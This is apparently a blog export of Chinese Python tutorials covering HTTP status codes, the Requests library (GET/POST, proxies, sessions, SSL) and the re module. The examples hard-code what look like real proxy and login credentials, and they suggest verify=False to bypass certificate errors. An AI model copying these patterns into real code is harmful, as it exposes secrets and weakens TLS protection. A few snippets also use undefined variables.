Created\n请求被创建完成，同时新的资源被创建。\n202 Accepted\n供处理的请求已被接受，但是处理未完成。\n203 Non-authoritative Information\n文档已经正常地返回，但一些应答头可能不正确，因为使用的是文档的拷贝。\n204 No Content\n没有新文档。浏览器应该继续显示原来的文档。如果用户定期地刷新页面，而Servlet可以确定用户文档足够新，这个状态代码是很有用的。\n205 Reset Content\n没有新文档。但浏览器应该重置它所显示的内容。用来强制浏览器清除表单输入内容。\n206 Partial Content\n客户发送了一个带有Range头的GET请求，服务器完成了它。\n\n\n\n3xx:重定向\n\n300 Multiple Choices\n多重选择。链接列表。用户可以选择某链接到达目的地。最多允许五个地址。\n301 Moved Permanently\n所请求的页面已经转移至新的url。\n302 Moved Temporarily\n所请求的页面已经临时转移至新的url。\n303 See Other\n所请求的页面可在别的url下被找到。\n304 Not Modified\n未按预期修改文档。客户端有缓冲的文档并发出了一个条件性的请求（一般是提供If-Modified-Since头表示客户只想比指定日期更新的文档）。服务器告诉客户，原来缓冲的文档还可以继续使用。\n305 Use Proxy\n客户请求的文档应该通过Location头所指明的代理服务器提取。\n306 Unused\n此代码被用于前一版本。目前已不再使用，但是代码依然被保留。\n307 Temporary Redirect\n被请求的页面已经临时移至新的url。\n\n\n\n4xx:客户端错误\n\n400 Bad Request\n服务器未能理解请求。\n401 Unauthorized\n被请求的页面需要用户名和密码。\n401.1\n登录失败。\n401.2\n服务器配置导致登录失败。\n401.3\n由于 ACL 对资源的限制而未获得授权。\n401.4\n筛选器授权失败。\n401.5\nISAPI/CGI 应用程序授权失败。\n401.7\n访问被 Web 服务器上的 URL 授权策略拒绝。这个错误代码为 IIS 6.0 所专用。\n402 Payment Required\n此代码尚无法使用。\n403 Forbidden\n对被请求页面的访问被禁止。\n403.1\n执行访问被禁止。\n403.2\n读访问被禁止。\n403.3\n写访问被禁止。\n403.4\n要求 SSL。\n403.5\n要求 SSL 128。\n403.6\nIP 地址被拒绝。\n403.7\n要求客户端证书。\n403.8\n站点访问被拒绝。\n403.9\n用户数过多。\n403.10\n配置无效。\n403.11\n密码更改。\n403.12\n拒绝访问映射表。\n403.13\n客户端证书被吊销。\n403.14\n拒绝目录列表。\n403.15\n超出客户端访问许可。\n403.16\n客户端证书不受信任或无效。\n403.17\n客户端证书已过期或尚未生效。\n403.18\n在当前的应用程序池中不能执行所请求的 URL。这个错误代码为 IIS 6.0 所专用。\n403.19\n不能为这个应用程序池中的客户端执行 CGI。这个错误代码为 IIS 6.0 所专用。\n403.20\nPassport 登录失败。这个错误代码为 IIS 6.0 所专用。\n404 Not Found\n服务器无法找到被请求的页面。\n404.0\n没有找到文件或目录。\n404.1\n无法在所请求的端口上访问 Web 站点。\n404.2\nWeb 服务扩展锁定策略阻止本请求。\n404.3\nMIME 映射策略阻止本请求。\n405 Method Not Allowed\n请求中指定的方法不被允许。\n406 Not Acceptable\n服务器生成的响应无法被客户端所接受。\n407 Proxy Authentication Required\n用户必须首先使用代理服务器进行验证，这样请求才会被处理。\n408 Request Timeout\n请求超出了服务器的等待时间。\n409 Conflict\n由于冲突，请求无法被完成。\n410 Gone\n被请求的页面不可用。\n411 Length Required\n\"Content-Length\" 未被定义。如果无此内容，服务器不会接受请求。\n412 Precondition Failed\n请求中的前提条件被服务器评估为失败。\n413 Request Entity Too Large\n由于所请求的实体的太大，服务器不会接受请求。\n414 Request-url Too Long\n由于url太长，服务器不会接受请求。当post请求被转换为带有很长的查询信息的get请求时，就会发生这种情况。\n415 Unsupported Media Type\n由于媒介类型不被支持，服务器不会接受请求。\n416 Requested Range Not Satisfiable\n服务器不能满足客户在请求中指定的Range头。\n417 Expectation Failed\n执行失败。\n423\n锁定的错误。\n\n\n\n5xx:服务器错误\n\n500 Internal Server Error\n请求未完成。服务器遇到不可预知的情况。\n500.12\n应用程序正忙于在 Web 服务器上重新启动。\n500.13\nWeb 服务器太忙。\n500.15\n不允许直接请求 Global.asa。\n500.16\nUNC 授权凭据不正确。这个错误代码为 IIS 6.0 所专用。\n500.18\nURL 授权存储不能打开。这个错误代码为 IIS 6.0 所专用。\n500.100\n内部 ASP 错误。\n501 Not Implemented\n请求未完成。服务器不支持所请求的功能。\n502 Bad Gateway\n请求未完成。服务器从上游服务器收到一个无效的响应。\n502.1\nCGI 应用程序超时。　·\n502.2\nCGI 应用程序出错。\n503 Service Unavailable\n请求未完成。服务器临时过载或当机。\n504 Gateway Timeout\n网关超时。\n505 HTTP Version Not Supported\n服务器不支持请求中指明的HTTP协议版本</code></pre>\n                                    </div>", "log_PostTime": 1584891190, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python：Resquest模块", "log_Intro": "Python：Resquest模块", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1 id=\"requests-让-http-服务人类\">Requests: 让 HTTP 服务人类</h1>\n\n<p>虽然Python的标准库中 urllib2 模块已经包含了平常我们使用的大多数功能，但是它的 API 使用起来让人感觉不太好，而 Requests 自称 “HTTP for Humans”，说明使用更简洁方便。</p>\n\n<blockquote>\n<p>Requests 唯一的一个非转基因的 Python HTTP 库，人类可以安全享用：）</p>\n</blockquote>\n\n<p>Requests 继承了urllib2的所有特性。Requests支持HTTP连接保持和连接池，支持使用cookie保持会话，支持文件上传，支持自动确定响应内容的编码，支持国际化的 URL 和 POST 数据自动编码。</p>\n\n<p>requests 的底层实现其实就是 urllib3</p>\n\n<p>Requests的文档非常完备，中文文档也相当不错。Requests能完全满足当前网络的需求，支持Python 2.6—3.5，而且能在PyPy下完美运行。</p>\n\n<p>开源地址：<a href=\"https://github.com/kennethreitz/requests\">https://github.com/kennethreitz/requests</a></p>\n\n<p>中文文档 API： <a href=\"http://docs.python-requests.org/zh_CN/latest/index.html\" rel=\"nofollow\">http://docs.python-requests.org/zh_CN/latest/index.html</a></p>\n\n<h2 id=\"安装方式\">安装方式</h2>\n\n<p>利用 pip 安装 或者利用 easy_install 都可以完成安装：</p>\n\n<pre class=\"has\">\n<code>$ pip install requests\n\n$ easy_install requests\n</code></pre>\n\n<h2 id=\"基本get请求（headers参数-和-parmas参数）\">基本GET请求（headers参数 和 parmas参数）</h2>\n\n<p>1. 最基本的GET请求可以直接用get方法</p>\n\n<pre class=\"has\">\n<code>response = requests.get(\"http://www.baidu.com/\")\n\n# 也可以这么写\n# response = requests.request(\"get\", \"http://www.baidu.com/\")\n</code></pre>\n\n<p>2. 添加 headers 和 查询参数</p>\n\n<p>如果想添加 headers，可以传入<code>headers</code>参数来增加请求头中的headers信息。如果要将参数放在url中传递，可以利用 <code>params</code> 参数。</p>\n\n<pre class=\"has\">\n<code>\nimport requests\n\nkw = {'wd':'长城'}\n\nheaders = {\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36\"}\n\n# params 接收一个字典或者字符串的查询参数，字典类型自动转换为url编码，不需要urlencode()\nresponse = requests.get(\"http://www.baidu.com/s?\", params = kw, headers = headers)\n\n# 查看响应内容，response.text 返回的是Unicode格式的数据\nprint response.text\n\n# 查看响应内容，response.content返回的字节流数据\nprint respones.content\n\n# 查看完整url地址\nprint response.url\n\n# 查看响应头部字符编码\nprint response.encoding\n\n# 查看响应码\nprint response.status_code\n</code></pre>\n\n<p>运行结果</p>\n\n<pre class=\"has\">\n<code>......\n\n......\n\n'http://www.baidu.com/s?wd=%E9%95%BF%E5%9F%8E'\n\n'utf-8'\n\n200\n</code></pre>\n\n<blockquote>\n<ul><li>\n\t<p>使用response.text 时，Requests 会基于 HTTP 响应的文本编码自动解码响应内容，大多数 Unicode 字符集都能被无缝地解码。</p>\n\t</li>\n\t<li>\n\t<p>使用response.content 时，返回的是服务器响应数据的原始二进制字节流，可以用来保存图片等二进制文件。</p>\n\t</li>\n</ul></blockquote>\n\n<h2 id=\"基本post请求（data参数）\">基本POST请求（data参数）</h2>\n\n<p>1. 最基本的GET请求可以直接用post方法</p>\n\n<pre class=\"has\">\n<code>response = requests.post(\"http://www.baidu.com/\", data = data)\n</code></pre>\n\n<p>2. 传入data数据</p>\n\n<p>对于 POST 请求来说，我们一般需要为它增加一些参数。那么最基本的传参方法可以利用 <code>data</code> 这个参数。</p>\n\n<pre class=\"has\">\n<code>import requests\n\nformdata = {\n    \"type\":\"AUTO\",\n    \"i\":\"i love python\",\n    \"doctype\":\"json\",\n    \"xmlVersion\":\"1.8\",\n    \"keyfrom\":\"fanyi.web\",\n    \"ue\":\"UTF-8\",\n    \"action\":\"FY_BY_ENTER\",\n    \"typoResult\":\"true\"\n}\n\nurl = \"http://fanyi.youdao.com/translate?smartresult=dict&amp;smartresult=rule&amp;smartresult=ugc&amp;sessionFrom=null\"\n\nheaders={ \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36\"}\n\nresponse = requests.post(url, data = formdata, headers = headers)\n\nprint response.text\n\n# 如果是json文件可以直接显示\nprint response.json()\n</code></pre>\n\n<p>运行结果</p>\n\n<pre class=\"has\">\n<code>{\"type\":\"EN2ZH_CN\",\"errorCode\":0,\"elapsedTime\":2,\"translateResult\":[[{\"src\":\"i love python\",\"tgt\":\"我喜欢python\"}]],\"smartResult\":{\"type\":1,\"entries\":[\"\",\"肆文\",\"高德纳\"]}}\n\n{u'errorCode': 0, u'elapsedTime': 0, u'translateResult': [[{u'src': u'i love python', u'tgt': u'\\u6211\\u559c\\u6b22python'}]], u'smartResult': {u'type': 1, u'entries': [u'', u'\\u8086\\u6587', u'\\u9ad8\\u5fb7\\u7eb3']}, u'type': u'EN2ZH_CN'}\n</code></pre>\n\n<h2 id=\"代理（proxies参数）\">代理（proxies参数）</h2>\n\n<p>如果需要使用代理，你可以通过为任意请求方法提供 <code>proxies</code> 参数来配置单个请求：</p>\n\n<pre class=\"has\">\n<code>import requests\n\n# 根据协议类型，选择不同的代理\nproxies = {\n  \"http\": \"http://12.34.56.79:9527\",\n  \"https\": \"http://12.34.56.79:9527\",\n}\n\nresponse = requests.get(\"http://www.baidu.com\", proxies = proxies)\nprint response.text\n</code></pre>\n\n<p>也可以通过本地环境变量 <code>HTTP_PROXY</code> 和 <code>HTTPS_PROXY</code> 来配置代理：</p>\n\n<pre class=\"has\">\n<code>export HTTP_PROXY=\"http://12.34.56.79:9527\"\nexport HTTPS_PROXY=\"https://12.34.56.79:9527\"\n</code></pre>\n\n<h2 id=\"私密代理验证（特定格式）-和-web客户端验证（auth-参数）\">私密代理验证（特定格式） 和 Web客户端验证（auth 参数）</h2>\n\n<p>urllib2 这里的做法比较复杂，requests只需要一步：</p>\n\n<p>私密代理</p>\n\n<pre class=\"has\">\n<code>\nimport requests\n\n# 如果代理需要使用HTTP Basic Auth，可以使用下面这种格式：\nproxy = { \"http\": \"mr_mao_hacker:sffqry9r@61.158.163.130:16816\" }\n\nresponse = requests.get(\"http://www.baidu.com\", proxies = proxy)\n\nprint response.text\n</code></pre>\n\n<p>web客户端验证</p>\n\n<p>如果是Web客户端验证，需要添加 auth = (账户名, 密码)</p>\n\n<pre class=\"has\">\n<code>import requests\n\nauth=('test', '123456')\n\nresponse = requests.get('http://192.168.199.107', auth = auth)\n\nprint response.text\n</code></pre>\n\n<blockquote>\n<p>urllib2 泪奔...</p>\n</blockquote>\n\n<h2 id=\"cookies-和-sission\">Cookies 和 Sission</h2>\n\n<h3 id=\"cookies\">Cookies</h3>\n\n<p>如果一个响应中包含了cookie，那么我们可以利用 cookies参数拿到：</p>\n\n<pre class=\"has\">\n<code>\nimport requests\n\nresponse = requests.get(\"http://www.baidu.com/\")\n\n# 7. 返回CookieJar对象:\ncookiejar = response.cookies\n\n# 8. 将CookieJar转为字典：\ncookiedict = requests.utils.dict_from_cookiejar(cookiejar)\n\nprint cookiejar\n\nprint cookiedict\n</code></pre>\n\n<p>运行结果：</p>\n\n<pre class=\"has\">\n<code>&lt;RequestsCookieJar[&lt;Cookie BDORZ=27315 for .baidu.com/&gt;]&gt;\n\n{'BDORZ': '27315'}\n</code></pre>\n\n<h3 id=\"sission\">Sission</h3>\n\n<p>在 requests 里，session对象是一个非常常用的对象，这个对象代表一次用户会话：从客户端浏览器连接服务器开始，到客户端浏览器与服务器断开。</p>\n\n<p>会话能让我们在跨请求时候保持某些参数，比如在同一个 Session 实例发出的所有请求之间保持 cookie 。</p>\n\n<p>实现人人网登录</p>\n\n<pre class=\"has\">\n<code>import requests\n\n# 1. 创建session对象，可以保存Cookie值\nssion = requests.session()\n\n# 2. 处理 headers\nheaders = {\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36\"}\n\n# 3. 需要登录的用户名和密码\ndata = {\"email\":\"mr_mao_hacker@163.com\", \"password\":\"alarmchime\"}  \n\n# 4. 发送附带用户名和密码的请求，并获取登录后的Cookie值，保存在ssion里\nssion.post(\"http://www.renren.com/PLogin.do\", data = data)\n\n# 5. ssion包含用户登录后的Cookie值，可以直接访问那些登录后才可以访问的页面\nresponse = ssion.get(\"http://www.renren.com/410043129/profile\")\n\n# 6. 打印响应内容\nprint response.text\n</code></pre>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191023180902152.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"> </p>\n\n<p> </p>\n\n<h2 id=\"处理https请求-ssl证书验证\">处理HTTPS请求 SSL证书验证</h2>\n\n<p>Requests也可以为HTTPS请求验证SSL证书：</p>\n\n<ul><li>要想检查某个主机的SSL证书，你可以使用 verify 参数（也可以不写）</li>\n</ul><pre class=\"has\">\n<code>import requests\nresponse = requests.get(\"https://www.baidu.com/\", verify=True)\n\n# 也可以省略不写\n# response = requests.get(\"https://www.baidu.com/\")\nprint r.text\n</code></pre>\n\n<p>运行结果：</p>\n\n<pre class=\"has\">\n<code>&lt;!DOCTYPE html&gt;\n&lt;!--STATUS OK--&gt;&lt;html&gt; &lt;head&gt;&lt;meta http-equiv=content-type content=text/html;charset=utf-8&gt;&lt;meta http-equiv=X-UA-Compatible content=IE=Edge&gt;百度一下，你就知道 ....\n</code></pre>\n\n<ul><li>如果SSL证书验证不通过，或者不信任服务器的安全证书，则会报出SSLError，据说 12306 证书是自己做的：</li>\n</ul><p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191023180920452.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"> </p>\n\n<p> </p>\n\n<p>来测试一下：</p>\n\n<pre class=\"has\">\n<code>import requests\nresponse = requests.get(\"https://www.12306.cn/mormhweb/\")\nprint response.text\n</code></pre>\n\n<p>果然：</p>\n\n<p><code>SSLError: (\"bad handshake: Error([('SSL routines', 'ssl3_get_server_certificate', 'certificate verify failed')],)\",)</code></p>\n\n<p><strong>如果我们想跳过 12306 的证书验证，把 verify 设置为 False 就可以正常请求了。</strong></p>\n\n<pre class=\"has\">\n<code>r = requests.get(\"https://www.12306.cn/mormhweb/\", verify = False)</code></pre>\n                                    </div>", "log_PostTime": 1584891192, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python：正则表达式re模块", "log_Intro": "Python：正则表达式re模块", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h2 id=\"为什么要学正则表达式\">为什么要学正则表达式</h2>\n\n<p>实际上爬虫一共就四个主要步骤：</p>\n\n<ol><li>明确目标 (要知道你准备在哪个范围或者网站去搜索)</li>\n\t<li>爬 (将所有的网站的内容全部爬下来)</li>\n\t<li>取 (去掉对我们没用处的数据)</li>\n\t<li>处理数据（按照我们想要的方式存储和使用）</li>\n</ol><p>我们在昨天的案例里实际上省略了第3步，也就是\"取\"的步骤。因为我们down下了的数据是全部的网页，这些数据很庞大并且很混乱，大部分的东西使我们不关心的，因此我们需要将之按我们的需要过滤和匹配出来。</p>\n\n<p>那么对于文本的过滤或者规则的匹配，最强大的就是正则表达式，是Python爬虫世界里必不可少的神兵利器。</p>\n\n<h2 id=\"什么是正则表达式\">什么是正则表达式</h2>\n\n<blockquote>\n<p>正则表达式，又称规则表达式，通常被用来检索、替换那些符合某个模式(规则)的文本。</p>\n\n<p>正则表达式是对字符串操作的一种逻辑公式，就是用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。</p>\n</blockquote>\n\n<p>给定一个正则表达式和另一个字符串，我们可以达到如下的目的：</p>\n\n<blockquote>\n<ul><li>给定的字符串是否符合正则表达式的过滤逻辑（“匹配”）；</li>\n\t<li>通过正则表达式，从文本字符串中获取我们想要的特定部分（“过滤”）。</li>\n</ul></blockquote>\n\n<p> </p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191023182104259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"> </p>\n\n<h2 id=\"正则表达式匹配规则\">正则表达式匹配规则</h2>\n\n<blockquote>\n<p> </p>\n</blockquote>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191023182124634.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"> </p>\n\n<h2 id=\"python-的-re-模块\">Python 的 re 模块</h2>\n\n<p>在 Python 中，我们可以使用内置的 re 模块来使用正则表达式。</p>\n\n<p>有一点需要特别注意的是，正则表达式使用 对特殊字符进行转义，所以如果我们要使用原始字符串，只需加一个 r 前缀，示例：</p>\n\n<pre class=\"has\">\n<code>r'chuanzhiboke\\t\\.\\tpython'\n</code></pre>\n\n<h3 id=\"re-模块的一般使用步骤如下：\">re 模块的一般使用步骤如下：</h3>\n\n<ol><li>\n\t<p>使用 <code>compile()</code> 函数将正则表达式的字符串形式编译为一个 <code>Pattern</code> 对象</p>\n\t</li>\n\t<li>\n\t<p>通过 <code>Pattern</code> 对象提供的一系列方法对文本进行匹配查找，获得匹配结果，一个 Match 对象。</p>\n\t</li>\n\t<li>最后使用 <code>Match</code> 对象提供的属性和方法获得信息，根据需要进行其他的操作</li>\n</ol><h3 id=\"compile-函数\">compile 函数</h3>\n\n<p>compile 函数用于编译正则表达式，生成一个 Pattern 对象，它的一般使用形式如下：</p>\n\n<pre class=\"has\">\n<code>import re\n\n# 将正则表达式编译成 Pattern 对象\npattern = re.compile(r'\\d+')\n</code></pre>\n\n<p>在上面，我们已将一个正则表达式编译成 Pattern 对象，接下来，我们就可以利用 pattern 的一系列方法对文本进行匹配查找了。</p>\n\n<p>Pattern 对象的一些常用方法主要有：</p>\n\n<blockquote>\n<ul><li>match 方法：从起始位置开始查找，一次匹配</li>\n\t<li>search 方法：从任何位置开始查找，一次匹配</li>\n\t<li>findall 方法：全部匹配，返回列表</li>\n\t<li>finditer 方法：全部匹配，返回迭代器</li>\n\t<li>split 方法：分割字符串，返回列表</li>\n\t<li>sub 方法：替换</li>\n</ul></blockquote>\n\n<h2 id=\"match-方法\">match 方法</h2>\n\n<p>match 方法用于查找字符串的头部（也可以指定起始位置），它是一次匹配，只要找到了一个匹配的结果就返回，而不是查找所有匹配的结果。它的一般使用形式如下：</p>\n\n<p><code>match(string[, pos[, endpos]])</code></p>\n\n<p>其中，string 是待匹配的字符串，pos 和 endpos 是可选参数，指定字符串的起始和终点位置，默认值分别是 0 和 len (字符串长度)。因此，当你不指定 pos 和 endpos 时，match 方法默认匹配字符串的头部。</p>\n\n<p>当匹配成功时，返回一个 Match 对象，如果没有匹配上，则返回 None。</p>\n\n<pre class=\"has\">\n<code>&gt;&gt;&gt; import re\n&gt;&gt;&gt; pattern = re.compile(r'\\d+')  # 用于匹配至少一个数字\n\n&gt;&gt;&gt; m = pattern.match('one12twothree34four')  # 查找头部，没有匹配\n&gt;&gt;&gt; print m\nNone\n\n&gt;&gt;&gt; m = pattern.match('one12twothree34four', 2, 10) # 从'e'的位置开始匹配，没有匹配\n&gt;&gt;&gt; print m\nNone\n\n&gt;&gt;&gt; m = pattern.match('one12twothree34four', 3, 10) # 从'1'的位置开始匹配，正好匹配\n&gt;&gt;&gt; print m                                         # 返回一个 Match 对象\n&lt;_sre.SRE_Match object at 0x10a42aac0&gt;\n\n&gt;&gt;&gt; m.group(0)   # 可省略 0\n'12'\n&gt;&gt;&gt; m.start(0)   # 可省略 0\n3\n&gt;&gt;&gt; m.end(0)     # 可省略 0\n5\n&gt;&gt;&gt; m.span(0)    # 可省略 0\n(3, 5)\n</code></pre>\n\n<p>在上面，当匹配成功时返回一个 Match 对象，其中：</p>\n\n<ul><li>\n\t<p>group([group1, …]) 方法用于获得一个或多个分组匹配的字符串，当要获得整个匹配的子串时，可直接使用 group() 或 group(0)；</p>\n\t</li>\n\t<li>\n\t<p>start([group]) 方法用于获取分组匹配的子串在整个字符串中的起始位置（子串第一个字符的索引），参数默认值为 0；</p>\n\t</li>\n\t<li>end([group]) 方法用于获取分组匹配的子串在整个字符串中的结束位置（子串最后一个字符的索引+1），参数默认值为 0；</li>\n\t<li>span([group]) 方法返回 (start(group), end(group))。</li>\n</ul><p>再看看一个例子：</p>\n\n<pre class=\"has\">\n<code>\n&gt;&gt;&gt; import re\n&gt;&gt;&gt; pattern = re.compile(r'([a-z]+) ([a-z]+)', re.I)  # re.I 表示忽略大小写\n&gt;&gt;&gt; m = pattern.match('Hello World Wide Web')\n\n&gt;&gt;&gt; print m     # 匹配成功，返回一个 Match 对象\n&lt;_sre.SRE_Match object at 0x10bea83e8&gt;\n\n&gt;&gt;&gt; m.group(0)  # 返回匹配成功的整个子串\n'Hello World'\n\n&gt;&gt;&gt; m.span(0)   # 返回匹配成功的整个子串的索引\n(0, 11)\n\n&gt;&gt;&gt; m.group(1)  # 返回第一个分组匹配成功的子串\n'Hello'\n\n&gt;&gt;&gt; m.span(1)   # 返回第一个分组匹配成功的子串的索引\n(0, 5)\n\n&gt;&gt;&gt; m.group(2)  # 返回第二个分组匹配成功的子串\n'World'\n\n&gt;&gt;&gt; m.span(2)   # 返回第二个分组匹配成功的子串\n(6, 11)\n\n&gt;&gt;&gt; m.groups()  # 等价于 (m.group(1), m.group(2), ...)\n('Hello', 'World')\n\n&gt;&gt;&gt; m.group(3)   # 不存在第三个分组\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nIndexError: no such group\n</code></pre>\n\n<p>------------------------------------------------------------------------------------------------------</p>\n\n<h2 id=\"search-方法\">search 方法</h2>\n\n<p>search 方法用于查找字符串的任何位置，它也是一次匹配，只要找到了一个匹配的结果就返回，而不是查找所有匹配的结果，它的一般使用形式如下：</p>\n\n<p><code>search(string[, pos[, endpos]])</code></p>\n\n<p>其中，string 是待匹配的字符串，pos 和 endpos 是可选参数，指定字符串的起始和终点位置，默认值分别是 0 和 len (字符串长度)。</p>\n\n<p>当匹配成功时，返回一个 Match 对象，如果没有匹配上，则返回 None。</p>\n\n<p>让我们看看例子：</p>\n\n<pre class=\"has\">\n<code>&gt;&gt;&gt; import re\n&gt;&gt;&gt; pattern = re.compile('\\d+')\n&gt;&gt;&gt; m = pattern.search('one12twothree34four')  # 这里如果使用 match 方法则不匹配\n&gt;&gt;&gt; m\n&lt;_sre.SRE_Match object at 0x10cc03ac0&gt;\n&gt;&gt;&gt; m.group()\n'12'\n&gt;&gt;&gt; m = pattern.search('one12twothree34four', 10, 30)  # 指定字符串区间\n&gt;&gt;&gt; m\n&lt;_sre.SRE_Match object at 0x10cc03b28&gt;\n&gt;&gt;&gt; m.group()\n'34'\n&gt;&gt;&gt; m.span()\n(13, 15)\n</code></pre>\n\n<p>再来看一个例子：</p>\n\n<pre class=\"has\">\n<code># -*- coding: utf-8 -*-\n\nimport re\n# 将正则表达式编译成 Pattern 对象\npattern = re.compile(r'\\d+')\n# 使用 search() 查找匹配的子串，不存在匹配的子串时将返回 None\n# 这里使用 match() 无法成功匹配\nm = pattern.search('hello 123456 789')\nif m:\n    # 使用 Match 获得分组信息\n    print 'matching string:',m.group()\n    # 起始位置和结束位置\n    print 'position:',m.span()\n</code></pre>\n\n<p>执行结果：</p>\n\n<pre class=\"has\">\n<code>matching string: 123456\nposition: (6, 12)\n</code></pre>\n\n<p>------------------------------------------------------------------------------------------------------</p>\n\n<h2 id=\"findall-方法\">findall 方法</h2>\n\n<p>上面的 match 和 search 方法都是一次匹配，只要找到了一个匹配的结果就返回。然而，在大多数时候，我们需要搜索整个字符串，获得所有匹配的结果。</p>\n\n<p>findall 方法的使用形式如下：</p>\n\n<p><code>findall(string[, pos[, endpos]])</code></p>\n\n<p>其中，string 是待匹配的字符串，pos 和 endpos 是可选参数，指定字符串的起始和终点位置，默认值分别是 0 和 len (字符串长度)。</p>\n\n<p>findall 以列表形式返回全部能匹配的子串，如果没有匹配，则返回一个空列表。</p>\n\n<p>看看例子：</p>\n\n<pre class=\"has\">\n<code>import re\npattern = re.compile(r'\\d+')   # 查找数字\n\nresult1 = pattern.findall('hello 123456 789')\nresult2 = pattern.findall('one1two2three3four4', 0, 10)\n\nprint result1\nprint result2\n</code></pre>\n\n<p>执行结果：</p>\n\n<pre class=\"has\">\n<code>['123456', '789']\n['1', '2']\n</code></pre>\n\n<p>再先看一个栗子：</p>\n\n<pre class=\"has\">\n<code># re_test.py\n\nimport re\n\n#re模块提供一个方法叫compile模块，提供我们输入一个匹配的规则\n#然后返回一个pattern实例，我们根据这个规则去匹配字符串\npattern = re.compile(r'\\d+\\.\\d*')\n\n#通过partten.findall()方法就能够全部匹配到我们得到的字符串\nresult = pattern.findall(\"123.141593, 'bigcat', 232312, 3.15\")\n\n#findall 以 列表形式 返回全部能匹配的子串给result\nfor item in result:\n    print item\n</code></pre>\n\n<p>运行结果：</p>\n\n<pre class=\"has\">\n<code>123.141593\n3.15\n</code></pre>\n\n<p>------------------------------------------------------------------------------------------------------</p>\n\n<h2 id=\"finditer-方法\">finditer 方法</h2>\n\n<p>finditer 方法的行为跟 findall 的行为类似，也是搜索整个字符串，获得所有匹配的结果。但它返回一个顺序访问每一个匹配结果（Match 对象）的迭代器。</p>\n\n<p>看看例子：</p>\n\n<pre class=\"has\">\n<code># -*- coding: utf-8 -*-\n\nimport re\npattern = re.compile(r'\\d+')\n\nresult_iter1 = pattern.finditer('hello 123456 789')\nresult_iter2 = pattern.finditer('one1two2three3four4', 0, 10)\n\nprint type(result_iter1)\nprint type(result_iter2)\n\nprint 'result1...'\nfor m1 in result_iter1:   # m1 是 Match 对象\n    print 'matching string: {}, position: {}'.format(m1.group(), m1.span())\n\nprint 'result2...'\nfor m2 in result_iter2:\n    print 'matching string: {}, position: {}'.format(m2.group(), m2.span())\n</code></pre>\n\n<p>执行结果：</p>\n\n<pre class=\"has\">\n<code>&lt;type 'callable-iterator'&gt;\n&lt;type 'callable-iterator'&gt;\nresult1...\nmatching string: 123456, position: (6, 12)\nmatching string: 789, position: (13, 16)\nresult2...\nmatching string: 1, position: (3, 4)\nmatching string: 2, position: (7, 8)\n</code></pre>\n\n<p>------------------------------------------------------------------------------------------------------</p>\n\n<h2 id=\"split-方法\">split 方法</h2>\n\n<p>split 方法按照能够匹配的子串将字符串分割后返回列表，它的使用形式如下：</p>\n\n<p><code>split(string[, maxsplit])</code></p>\n\n<p>其中，maxsplit 用于指定最大分割次数，不指定将全部分割。</p>\n\n<p>看看例子：</p>\n\n<pre class=\"has\">\n<code>import re\np = re.compile(r'[\\s\\,\\;]+')\nprint p.split('a,b;; c   d')\n</code></pre>\n\n<p>执行结果：</p>\n\n<pre class=\"has\">\n<code>['a', 'b', 'c', 'd']\n</code></pre>\n\n<p>------------------------------------------------------------------------------------------------------</p>\n\n<h2 id=\"sub-方法\">sub 方法</h2>\n\n<p>sub 方法用于替换。它的使用形式如下：</p>\n\n<p><code>sub(repl, string[, count])</code></p>\n\n<p>其中，repl 可以是字符串也可以是一个函数：</p>\n\n<ul><li>\n\t<p>如果 repl 是字符串，则会使用 repl 去替换字符串每一个匹配的子串，并返回替换后的字符串，另外，repl 还可以使用 id 的形式来引用分组，但不能使用编号 0；</p>\n\t</li>\n\t<li>\n\t<p>如果 repl 是函数，这个方法应当只接受一个参数（Match 对象），并返回一个字符串用于替换（返回的字符串中不能再引用分组）。</p>\n\t</li>\n\t<li>count 用于指定最多替换次数，不指定时全部替换。</li>\n</ul><p>看看例子：</p>\n\n<pre class=\"has\">\n<code>import re\np = re.compile(r'(\\w+) (\\w+)') # \\w = [A-Za-z0-9]\ns = 'hello 123, hello 456'\n\nprint p.sub(r'hello world', s)  # 使用 'hello world' 替换 'hello 123' 和 'hello 456'\nprint p.sub(r'\\2 \\1', s)        # 引用分组\n\ndef func(m):\n    return 'hi' + ' ' + m.group(2)\n\nprint p.sub(func, s)\nprint p.sub(func, s, 1)         # 最多替换一次\n</code></pre>\n\n<p>执行结果：</p>\n\n<pre class=\"has\">\n<code>hello world, hello world\n123 hello, 456 hello\nhi 123, hi 456\nhi 123, hello 456\n</code></pre>\n\n<p>------------------------------------------------------------------------------------------------------</p>\n\n<h2 